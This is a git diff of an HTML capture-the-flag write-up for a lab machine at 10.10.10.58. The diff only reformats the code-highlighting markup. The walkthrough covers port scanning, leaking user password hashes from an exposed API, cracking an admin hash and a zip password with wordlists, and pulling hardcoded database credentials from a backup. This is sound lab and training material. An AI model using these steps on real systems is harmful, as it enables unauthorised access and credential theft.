@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.91.2" />
+<meta name="generator" content="Hugo 0.96.0" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -316,641 +316,641 @@ if (language) {
 <h2 id="port-scanning">Port scanning</h2>
 
 <p>We scan the full range of TCP ports using masscan:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.58
-<span class="err">
-</span><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-02-28 16:09:43 GMT
-</span><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-</span><span class="go">Initiating SYN Stealth Scan
-</span><span class="go">Scanning 1 hosts [65536 ports/host]
-</span><span class="go">Discovered open port 3000/tcp on 10.10.10.58                                   
-</span><span class="go">Discovered open port 22/tcp on 10.10.10.58 
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo masscan -e tun0 -p0-65535 --max-rate <span class="m">500</span> 10.10.10.58
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-02-28 16:09:43 GMT
+</span></span></span><span class="line"><span class="cl"><span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span></span></span><span class="line"><span class="cl"><span class="go">Initiating SYN Stealth Scan
+</span></span></span><span class="line"><span class="cl"><span class="go">Scanning 1 hosts [65536 ports/host]
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 3000/tcp on 10.10.10.58                                   
+</span></span></span><span class="line"><span class="cl"><span class="go">Discovered open port 22/tcp on 10.10.10.58 
+</span></span></span></code></pre></div></div></p>
 
 <p>We found TCP ports 22 and 3000 open. Let&rsquo;s explore them using nmap:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo nmap -A -p22,3000 10.10.10.58
-<span class="err">
-</span><span class="err"></span><span class="go">Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-28 18:13 EET
-</span><span class="go">Nmap scan report for 10.10.10.58
-</span><span class="go">Host is up (0.085s latency).
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">PORT     STATE SERVICE VERSION
-</span><span class="go">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
-</span><span class="go">| ssh-hostkey: 
-</span><span class="go">|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
-</span><span class="go">|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (EdDSA)
-</span><span class="go">3000/tcp open  http    Node.js Express framework
-</span><span class="go">| hadoop-datanode-info: 
-</span><span class="go">|_  Logs: /login
-</span><span class="go">|_hadoop-jobtracker-info: 
-</span><span class="go">| hadoop-tasktracker-info: 
-</span><span class="go">|_  Logs: /login
-</span><span class="go">|_hbase-master-info: 
-</span><span class="go">|_http-title: MyPlace
-</span><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-</span><span class="go">Aggressive OS guesses: Linux 3.10 - 4.8 (91%), Linux 3.2 - 4.8 (91%), Crestron XPanel control system (89%), Linux 3.18 (88%), Linux 3.16 (88%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%)
-</span><span class="go">No exact OS matches for host (test conditions non-ideal).
-</span><span class="go">Network Distance: 2 hops
-</span><span class="go">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo nmap -A -p22,3000 10.10.10.58
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-28 18:13 EET
+</span></span></span><span class="line"><span class="cl"><span class="go">Nmap scan report for 10.10.10.58
+</span></span></span><span class="line"><span class="cl"><span class="go">Host is up (0.085s latency).
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">PORT     STATE SERVICE VERSION
+</span></span></span><span class="line"><span class="cl"><span class="go">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+</span></span></span><span class="line"><span class="cl"><span class="go">| ssh-hostkey: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (EdDSA)
+</span></span></span><span class="line"><span class="cl"><span class="go">3000/tcp open  http    Node.js Express framework
+</span></span></span><span class="line"><span class="cl"><span class="go">| hadoop-datanode-info: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  Logs: /login
+</span></span></span><span class="line"><span class="cl"><span class="go">|_hadoop-jobtracker-info: 
+</span></span></span><span class="line"><span class="cl"><span class="go">| hadoop-tasktracker-info: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|_  Logs: /login
+</span></span></span><span class="line"><span class="cl"><span class="go">|_hbase-master-info: 
+</span></span></span><span class="line"><span class="cl"><span class="go">|_http-title: MyPlace
+</span></span></span><span class="line"><span class="cl"><span class="go">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span></span><span class="line"><span class="cl"><span class="go">Aggressive OS guesses: Linux 3.10 - 4.8 (91%), Linux 3.2 - 4.8 (91%), Crestron XPanel control system (89%), Linux 3.18 (88%), Linux 3.16 (88%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.2 (86%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (86%)
+</span></span></span><span class="line"><span class="cl"><span class="go">No exact OS matches for host (test conditions non-ideal).
+</span></span></span><span class="line"><span class="cl"><span class="go">Network Distance: 2 hops
+</span></span></span><span class="line"><span class="cl"><span class="go">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></span></code></pre></div></div></p>
 
 <h2 id="discovering-directories-and-files">Discovering directories and files</h2>
 
 <p>It&rsquo;s hard to brute force directories and files on the website at port 3000 because it returns the same response (status code 200) for nonexistent pages. But, if we surf this site using a proxy (like those of burpsuite or zaproxy) we intercept some very interesting requests:</p>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">GET /partials/home.html
-</span><span class="go">GET /api/users/latest
-</span><span class="go">POST /api/session/authenticate
-</span><span class="go">Exploitation
-</span><span class="go">Getting mark user
-</span></code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">GET /partials/home.html
+</span></span></span><span class="line"><span class="cl"><span class="go">GET /api/users/latest
+</span></span></span><span class="line"><span class="cl"><span class="go">POST /api/session/authenticate
+</span></span></span><span class="line"><span class="cl"><span class="go">Exploitation
+</span></span></span><span class="line"><span class="cl"><span class="go">Getting mark user
+</span></span></span></code></pre></div></div>
 
 <p>Let&rsquo;s visit <a href="http://10.10.10.58:3000/api/users/latest" target="_blank">http://10.10.10.58:3000/api/users/latest</a>
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">[{&#34;_id&#34;:&#34;59a7368398aa325cc03ee51d&#34;,&#34;username&#34;:&#34;tom&#34;,&#34;password&#34;:&#34;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59a7368e98aa325cc03ee51e&#34;,&#34;username&#34;:&#34;mark&#34;,&#34;password&#34;:&#34;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59aa9781cced6f1d1490fce9&#34;,&#34;username&#34;:&#34;rastating&#34;,&#34;password&#34;:&#34;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&#34;,&#34;is_admin&#34;:false}]
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">[{&#34;_id&#34;:&#34;59a7368398aa325cc03ee51d&#34;,&#34;username&#34;:&#34;tom&#34;,&#34;password&#34;:&#34;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59a7368e98aa325cc03ee51e&#34;,&#34;username&#34;:&#34;mark&#34;,&#34;password&#34;:&#34;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59aa9781cced6f1d1490fce9&#34;,&#34;username&#34;:&#34;rastating&#34;,&#34;password&#34;:&#34;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&#34;,&#34;is_admin&#34;:false}]
+</span></span></span></code></pre></div></div></p>
 
 <p>Hmmm. None of those users is an admin. Let&rsquo;s visit <a href="http://10.10.10.58:3000/api/users/" target="_blank">http://10.10.10.58:3000/api/users/</a>
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">[{&#34;_id&#34;:&#34;59a7365b98aa325cc03ee51c&#34;,&#34;username&#34;:&#34;myP14ceAdm1nAcc0uNT&#34;,&#34;password&#34;:&#34;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&#34;,&#34;is_admin&#34;:true},{&#34;_id&#34;:&#34;59a7368398aa325cc03ee51d&#34;,&#34;username&#34;:&#34;tom&#34;,&#34;password&#34;:&#34;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59a7368e98aa325cc03ee51e&#34;,&#34;username&#34;:&#34;mark&#34;,&#34;password&#34;:&#34;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59aa9781cced6f1d1490fce9&#34;,&#34;username&#34;:&#34;rastating&#34;,&#34;password&#34;:&#34;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&#34;,&#34;is_admin&#34;:false}]
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">[{&#34;_id&#34;:&#34;59a7365b98aa325cc03ee51c&#34;,&#34;username&#34;:&#34;myP14ceAdm1nAcc0uNT&#34;,&#34;password&#34;:&#34;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&#34;,&#34;is_admin&#34;:true},{&#34;_id&#34;:&#34;59a7368398aa325cc03ee51d&#34;,&#34;username&#34;:&#34;tom&#34;,&#34;password&#34;:&#34;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59a7368e98aa325cc03ee51e&#34;,&#34;username&#34;:&#34;mark&#34;,&#34;password&#34;:&#34;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&#34;,&#34;is_admin&#34;:false},{&#34;_id&#34;:&#34;59aa9781cced6f1d1490fce9&#34;,&#34;username&#34;:&#34;rastating&#34;,&#34;password&#34;:&#34;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&#34;,&#34;is_admin&#34;:false}]
+</span></span></span></code></pre></div></div></p>
 
 <p>Bingo! An additional username has appeared and he is an admin. The password field seems to be a hash. Let&rsquo;s find what type of hash it is:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>hashid dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
-<span class="err">
-</span><span class="err"></span><span class="go">Analyzing &#39;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&#39;
-</span><span class="go">[+] Snefru-256 
-</span><span class="go">[+] SHA-256 
-</span><span class="go">[+] RIPEMD-256 
-</span><span class="go">[+] Haval-256 
-</span><span class="go">[+] GOST R 34.11-94 
-</span><span class="go">[+] GOST CryptoPro S-Box 
-</span><span class="go">[+] SHA3-256 
-</span><span class="go">[+] Skein-256 
-</span><span class="go">[+] Skein-512(256)
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> hashid dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Analyzing &#39;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Snefru-256 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] SHA-256 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] RIPEMD-256 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Haval-256 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] GOST R 34.11-94 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] GOST CryptoPro S-Box 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] SHA3-256 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Skein-256 
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Skein-512(256)
+</span></span></span></code></pre></div></div></p>
 
 <p>Let&rsquo;s crack (i.e. reverse) this hash using hashcat:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>hashcat -h <span class="p">|</span> grep SHA-256
-<span class="go">   1400 | SHA-256                                          | Raw Hash
-</span><span class="go">   1411 | SSHA-256(Base64), LDAP {SSHA256}                 | HTTP, SMTP, LDAP Server
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="gp">$ </span>hashcat -a0 -m <span class="m">1400</span> dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af /usr/share/dict/rockyou.txt 
-<span class="go">hashcat (v3.5.0) starting...
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Hashes: 1 digests; 1 unique digests, 1 unique salts
-</span><span class="go">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-</span><span class="go">Rules: 1
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Applicable optimizers:
-</span><span class="go">* Zero-Byte
-</span><span class="go">* Precompute-Init
-</span><span class="go">* Precompute-Merkle-Demgard
-</span><span class="go">* Early-Skip
-</span><span class="go">* Not-Salted
-</span><span class="go">* Not-Iterated
-</span><span class="go">* Single-Hash
-</span><span class="go">* Single-Salt
-</span><span class="go">* Raw-Hash
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Dictionary cache hit:
-</span><span class="go">* Filename..: /usr/share/dict/rockyou.txt
-</span><span class="go">* Passwords.: 14343297
-</span><span class="go">* Bytes.....: 139921504
-</span><span class="go">* Keyspace..: 14343297
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> hashcat -h <span class="p">|</span> grep SHA-256
+</span></span><span class="line"><span class="cl"><span class="go">   1400 | SHA-256                                          | Raw Hash
+</span></span></span><span class="line"><span class="cl"><span class="go">   1411 | SSHA-256(Base64), LDAP {SSHA256}                 | HTTP, SMTP, LDAP Server
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> hashcat -a0 -m <span class="m">1400</span> dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af /usr/share/dict/rockyou.txt 
+</span></span><span class="line"><span class="cl"><span class="go">hashcat (v3.5.0) starting...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Hashes: 1 digests; 1 unique digests, 1 unique salts
+</span></span></span><span class="line"><span class="cl"><span class="go">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+</span></span></span><span class="line"><span class="cl"><span class="go">Rules: 1
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Applicable optimizers:
+</span></span></span><span class="line"><span class="cl"><span class="go">* Zero-Byte
+</span></span></span><span class="line"><span class="cl"><span class="go">* Precompute-Init
+</span></span></span><span class="line"><span class="cl"><span class="go">* Precompute-Merkle-Demgard
+</span></span></span><span class="line"><span class="cl"><span class="go">* Early-Skip
+</span></span></span><span class="line"><span class="cl"><span class="go">* Not-Salted
+</span></span></span><span class="line"><span class="cl"><span class="go">* Not-Iterated
+</span></span></span><span class="line"><span class="cl"><span class="go">* Single-Hash
+</span></span></span><span class="line"><span class="cl"><span class="go">* Single-Salt
+</span></span></span><span class="line"><span class="cl"><span class="go">* Raw-Hash
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Dictionary cache hit:
+</span></span></span><span class="line"><span class="cl"><span class="go">* Filename..: /usr/share/dict/rockyou.txt
+</span></span></span><span class="line"><span class="cl"><span class="go">* Passwords.: 14343297
+</span></span></span><span class="line"><span class="cl"><span class="go">* Bytes.....: 139921504
+</span></span></span><span class="line"><span class="cl"><span class="go">* Keyspace..: 14343297
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
+</span></span></span></code></pre></div></div></p>
 
 <p>We can use John the Ripper too:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span><span class="nb">echo</span> dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af &gt; hash.txt
-<span class="err">
-</span><span class="err"></span><span class="gp">$ </span>john --format<span class="o">=</span>Raw-SHA256 --wordlist<span class="o">=</span>/usr/share/dict/rockyou.txt hash.txt
-<span class="err">
-</span><span class="err"></span><span class="go">Using default input encoding: UTF-8
-</span><span class="go">Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
-</span><span class="go">manchester       (?)
-</span><span class="go">1g 0:00:00:00 DONE (2018-02-28 19:16) 33.33g/s 1092Kp/s 1092Kc/s 1092KC/s alamot..eatme1
-</span><span class="go">Use the &#34;--show&#34; option to display all of the cracked passwords reliably
-</span><span class="go">Session completed
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="gp">$ </span>john --show hash.txt
-<span class="go">0 password hashes cracked, 1 left
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> <span class="nb">echo</span> dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af &gt; hash.txt
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> john --format<span class="o">=</span>Raw-SHA256 --wordlist<span class="o">=</span>/usr/share/dict/rockyou.txt hash.txt
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Using default input encoding: UTF-8
+</span></span></span><span class="line"><span class="cl"><span class="go">Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+</span></span></span><span class="line"><span class="cl"><span class="go">manchester       (?)
+</span></span></span><span class="line"><span class="cl"><span class="go">1g 0:00:00:00 DONE (2018-02-28 19:16) 33.33g/s 1092Kp/s 1092Kc/s 1092KC/s alamot..eatme1
+</span></span></span><span class="line"><span class="cl"><span class="go">Use the &#34;--show&#34; option to display all of the cracked passwords reliably
+</span></span></span><span class="line"><span class="cl"><span class="go">Session completed
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> john --show hash.txt
+</span></span><span class="line"><span class="cl"><span class="go">0 password hashes cracked, 1 left
+</span></span></span></code></pre></div></div></p>
 
 <p>For some reason, the &ldquo;&ndash;show&rdquo; option doesn&rsquo;t work correctly in my case. Let&rsquo;s just check the .pot file:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>cat /home/alamot/.john/john.pot
-<span class="gp">$</span>SHA256<span class="nv">$dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af</span>:manchester
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat /home/alamot/.john/john.pot
+</span></span><span class="line"><span class="cl"><span class="gp">$</span>SHA256<span class="nv">$dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af</span>:manchester
+</span></span></code></pre></div></div></p>
 
 <p>Login to the website using the credentials myP14ceAdm1nAcc0uNT:manchester and download the backup file. The downloading process is very unstable and may be interrupted. Make sure you download the full file (3.3MB). Unfortunately, resume is not supported. You can use wget which automatically makes multiple tries to download the file correctly (you have to provide the cookie value that you get after a successfully login).</p>
 
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>wget --header <span class="s2">&#34;Cookie: connect.sid=s%3AuGlwY_gicWrNb2ESIiDzUPn9TTi-Dstj.5E1wGaKmQ7QgeS%2BC5%2FfZ3mjy8DCwSdySPOv4rRvvZfU&#34;</span> http://10.10.10.58:3000/api/admin/backup
-</code></pre></div></div>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> wget --header <span class="s2">&#34;Cookie: connect.sid=s%3AuGlwY_gicWrNb2ESIiDzUPn9TTi-Dstj.5E1wGaKmQ7QgeS%2BC5%2FfZ3mjy8DCwSdySPOv4rRvvZfU&#34;</span> http://10.10.10.58:3000/api/admin/backup
+</span></span></code></pre></div></div>
 
 <p>The file is based64-encoded. Let&rsquo;s decode it:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>cat myplace.backup <span class="p">|</span> base64 -d &gt; backup.zip
-</code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> cat myplace.backup <span class="p">|</span> base64 -d &gt; backup.zip
+</span></span></code></pre></div></div></p>
 
 <p>The zip file is password protected. Let&rsquo;s crack it using fcrackzip or zipcracker-ng:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>fcrackzip -uDp /usr/share/dict/rockyou.txt backup.zip
-<span class="go">PASSWORD FOUND!!!!: pw == magicword
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="gp">$ </span>zipcracker-ng -f backup.zip -w /usr/share/dict/rockyou.txt 
-<span class="go"> ~ ZIP Cracker-ng v2015.02-03 ~
-</span><span class="go"> - File......: backup.zip
-</span><span class="go"> * Chosen one: ...ce/node_modules/express/node_modules/qs/.eslintignore (5 bytes)
-</span><span class="go"> - Encryption: standard (traditional PKWARE)
-</span><span class="go"> - Method....: stored
-</span><span class="go"> - Generator.: rockyou.txt
-</span><span class="go"> . Worked at ~ 4782K pwd/sec for ~ 14M tries.
-</span><span class="go"> + Password found: magicword
-</span><span class="go">   HEXA[ 6D 61 67 69 63 77 6F 72 64 ]
-</span><span class="go"> ^ Ex(c)iting.
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> fcrackzip -uDp /usr/share/dict/rockyou.txt backup.zip
+</span></span><span class="line"><span class="cl"><span class="go">PASSWORD FOUND!!!!: pw == magicword
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">$</span> zipcracker-ng -f backup.zip -w /usr/share/dict/rockyou.txt 
+</span></span><span class="line"><span class="cl"><span class="go"> ~ ZIP Cracker-ng v2015.02-03 ~
+</span></span></span><span class="line"><span class="cl"><span class="go"> - File......: backup.zip
+</span></span></span><span class="line"><span class="cl"><span class="go"> * Chosen one: ...ce/node_modules/express/node_modules/qs/.eslintignore (5 bytes)
+</span></span></span><span class="line"><span class="cl"><span class="go"> - Encryption: standard (traditional PKWARE)
+</span></span></span><span class="line"><span class="cl"><span class="go"> - Method....: stored
+</span></span></span><span class="line"><span class="cl"><span class="go"> - Generator.: rockyou.txt
+</span></span></span><span class="line"><span class="cl"><span class="go"> . Worked at ~ 4782K pwd/sec for ~ 14M tries.
+</span></span></span><span class="line"><span class="cl"><span class="go"> + Password found: magicword
+</span></span></span><span class="line"><span class="cl"><span class="go">   HEXA[ 6D 61 67 69 63 77 6F 72 64 ]
+</span></span></span><span class="line"><span class="cl"><span class="go"> ^ Ex(c)iting.
+</span></span></span></code></pre></div></div></p>
 
 <p>If we explore the decompressed files from backup.zip, we find some credentials inside var/www/myplace/app.js:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>head -n12 var/www/myplace/app.js
-<span class="err">
-</span><span class="err"></span><span class="go">const express     = require(&#39;express&#39;);
-</span><span class="go">const session     = require(&#39;express-session&#39;);
-</span><span class="go">const bodyParser  = require(&#39;body-parser&#39;);
-</span><span class="go">const crypto      = require(&#39;crypto&#39;);
-</span><span class="go">const MongoClient = require(&#39;mongodb&#39;).MongoClient;
-</span><span class="go">const ObjectID    = require(&#39;mongodb&#39;).ObjectID;
-</span><span class="go">const path        = require(&#34;path&#34;);
-</span><span class="go">const spawn        = require(&#39;child_process&#39;).spawn;
-</span><span class="go">const app         = express();
-</span><span class="go">const url         = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;;
-</span><span class="go">const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> head -n12 var/www/myplace/app.js
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">const express     = require(&#39;express&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="go">const session     = require(&#39;express-session&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="go">const bodyParser  = require(&#39;body-parser&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="go">const crypto      = require(&#39;crypto&#39;);
+</span></span></span><span class="line"><span class="cl"><span class="go">const MongoClient = require(&#39;mongodb&#39;).MongoClient;
+</span></span></span><span class="line"><span class="cl"><span class="go">const ObjectID    = require(&#39;mongodb&#39;).ObjectID;
+</span></span></span><span class="line"><span class="cl"><span class="go">const path        = require(&#34;path&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="go">const spawn        = require(&#39;child_process&#39;).spawn;
+</span></span></span><span class="line"><span class="cl"><span class="go">const app         = express();
+</span></span></span><span class="line"><span class="cl"><span class="go">const url         = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&amp;authSource=myplace&#39;;
+</span></span></span><span class="line"><span class="cl"><span class="go">const backup_key  = &#39;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#39;;
+</span></span></span></code></pre></div></div></p>
